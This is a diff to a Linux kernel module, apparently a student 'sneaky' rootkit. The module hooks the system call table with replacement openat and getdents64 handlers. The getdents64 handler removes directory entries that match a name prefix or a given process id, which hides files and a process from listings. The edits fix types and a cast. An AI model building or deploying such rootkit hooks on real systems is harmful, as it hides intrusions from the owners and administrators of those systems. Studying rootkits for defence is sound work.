@@ -17,7 +17,7 @@ static unsigned long *sys_call_table;
 MODULE_LICENSE("GPL");
 char *sneaky_pid = "";
 module_param(sneaky_pid, charp, 0000);
-MODULE_PARM_DESC(sneaky_pid, "sneaky_pid");
+MODULE_PARM_DESC(pid, "sneaky_pid");
 
 struct linux_dirent64 {
 	unsigned long	d_ino;
@@ -67,11 +67,11 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 }
 
 //------------getdents64------------//
-asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
-asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
+asmlinkage long sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
 {
-  int og_num = original_getdents64(fd, dirp, count); // num byte read
+  long og_num = original_getdents64(fd, dirp, count); // num byte read
   if (og_num == 0 || og_num == -1)
   {
     return og_num;
@@ -85,7 +85,7 @@ asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dir
     if (strncmp(curr_dirp->d_name, PREFIX, strlen(PREFIX)) == 0 ||strcmp(curr_dirp->d_name, sneaky_pid) == 0)
     {
       printk(KERN_INFO "Sneaky_process being hide.\n");
-      memmove((char *)file + i, (char *)file + i + curr_dirp->d_reclen, og_num - (i + curr_dirp->d_reclen));
+      memmove(file + i, file + i + curr_dirp->d_reclen, og_num - (i + curr_dirp->d_reclen));
       og_num -= curr_dirp->d_reclen;
     }
     else{
